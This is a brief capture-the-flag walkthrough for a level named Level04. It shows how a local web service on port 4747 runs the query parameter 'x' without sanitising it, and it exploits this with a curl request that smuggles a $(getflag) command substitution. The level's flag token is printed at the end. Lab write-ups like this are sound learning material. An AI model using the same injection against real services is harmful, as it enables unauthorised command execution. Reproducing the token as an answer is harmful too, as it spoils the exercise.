# Level04

## Overview

This level involves exploiting a web service that improperly handles user input, allowing command execution via query parameters.

## Walkthrough

### 1. Identify the vulnerability

The service running on port `4747` takes a parameter (`x`) and executes it without proper sanitization. This makes it vulnerable to command injection.

### 2. Exploit the service

Send a request that injects the `getflag` command:

```bash id="m4x9qp"
curl 'http://localhost:4747/?x=$(getflag)'
```

### 3. Retrieve the flag

The command is executed by the service, and the output reveals the token.

Alternatively, if you gain a shell:

```bash id="n7c2ls"
getflag
```

## Token

```id="p8v5zw"
ne2searoevaevoem4ov4ar8ap
```

